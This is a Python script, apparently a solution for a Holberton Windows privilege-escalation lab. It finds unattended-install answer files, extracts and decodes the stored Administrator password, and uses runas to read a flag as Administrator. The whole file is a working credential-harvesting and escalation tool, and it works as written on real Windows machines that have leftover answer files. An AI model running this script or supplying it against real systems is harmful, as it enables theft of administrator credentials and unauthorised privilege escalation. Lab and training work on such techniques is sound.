#!/usr/bin/env python3
"""
extract_password.py

Windows privilege escalation via unattended installation files.

Scans common locations for Windows unattended-install answer files
(sysprep.inf, autounattend.xml, Unattend.xml), extracts the
<AdministratorPassword> value, decodes it, and uses `runas` to open an
administrative session so the Admin-desktop flag can be read.

Intended for an authorised lab target (Holberton windows_privsec LAB01).
"""

import os
import re
import base64
import subprocess


# 1. Typical file locations ------------------------------------------------
# Common paths where answer files are left behind after imaging / sysprep.
SEARCH_PATHS = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Unattend\Unattend.xml",
    r"C:\Windows\System32\Sysprep\Unattend.xml",
    r"C:\Windows\System32\Sysprep\Panther\Unattend.xml",
    r"C:\unattend.xml",
    r"C:\autounattend.xml",
    r"C:\Windows\Panther\sysprep.inf",
    r"C:\sysprep.inf",
    r"C:\sysprep\sysprep.inf",
]

# Bare filenames to also search for while walking the drive as a fallback.
TARGET_NAMES = {"sysprep.inf", "autounattend.xml", "unattend.xml"}


def find_answer_files():
    """Return answer files that exist, checking known paths then walking C:\\."""
    found = []

    for path in SEARCH_PATHS:
        if os.path.isfile(path):
            found.append(path)

    # Fallback: walk the filesystem for any answer file we missed.
    for root, _dirs, files in os.walk("C:\\"):
        for name in files:
            if name.lower() in TARGET_NAMES:
                full = os.path.join(root, name)
                if full not in found:
                    found.append(full)

    return found


# 2. Password extraction ---------------------------------------------------
def extract_password(contents):
    """Pull the <AdministratorPassword> <Value>...</Value> out of the file."""
    # Scope the search to the <AdministratorPassword> block first so we don't
    # pick up some other account's <Value>.
    block = re.search(
        r"<AdministratorPassword>(.*?)</AdministratorPassword>",
        contents,
        re.DOTALL | re.IGNORECASE,
    )
    scope = block.group(1) if block else contents

    match = re.search(r"<Value>(.*?)</Value>", scope,
                      re.DOTALL | re.IGNORECASE)
    if match:
        return match.group(1).strip()
    return None


# 3. Decoding --------------------------------------------------------------
def decode_password(raw):
    """
    Decode the extracted password.

    Windows stores the answer-file AdministratorPassword as Base64 of the
    UTF-16LE string with the literal suffix 'AdministratorPassword' appended
    before encoding. We try that first, then plain Base64, then fall back to
    treating the value as plaintext.
    """
    # Try Base64 -> UTF-16LE, stripping the appended marker.
    try:
        decoded = base64.b64decode(raw).decode("utf-16-le")
        if decoded.endswith("AdministratorPassword"):
            return decoded[: -len("AdministratorPassword")]
        return decoded
    except Exception:
        pass

    # Try plain Base64 (ASCII/UTF-8).
    try:
        return base64.b64decode(raw).decode("utf-8").rstrip("\x00")
    except Exception:
        pass

    # Fall back to plaintext.
    return raw


# 4. Admin session ---------------------------------------------------------
def open_admin_session(password, command=None):
    """
    Use runas to start a process as Administrator with the recovered password.

    runas does not accept a password on the command line, so we feed it on
    stdin. The command defaults to opening cmd on the Admin desktop; point it
    at the flag instead to print it directly.
    """
    if command is None:
        command = (
            'cmd /c "type %USERPROFILE%\\Desktop\\flag.txt"'
        )

    runas = ["runas", "/user:Administrator", command]
    try:
        proc = subprocess.Popen(
            runas,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        out, err = proc.communicate(input=password + "\n", timeout=30)
        return out, err
    except Exception as exc:
        return "", f"runas failed: {exc}"


def main():
    files = find_answer_files()
    if not files:
        print("[-] No unattended installation files found.")
        return

    for path in files:
        print(f"[+] Found answer file: {path}")
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                contents = fh.read()
        except OSError as exc:
            print(f"    [-] Could not read: {exc}")
            continue

        raw = extract_password(contents)
        if not raw:
            print("    [-] No AdministratorPassword value in this file.")
            continue

        print(f"    [+] Raw value: {raw}")
        password = decode_password(raw)
        print(f"    [+] Decoded password: {password}")

        print("    [*] Attempting admin session via runas ...")
        out, err = open_admin_session(password)
        if out.strip():
            print("    [+] Output:")
            print(out)
        if err.strip():
            print(f"    [-] runas stderr: {err}")
        return  # stop after the first file that yields a password


if __name__ == "__main__":
    main()
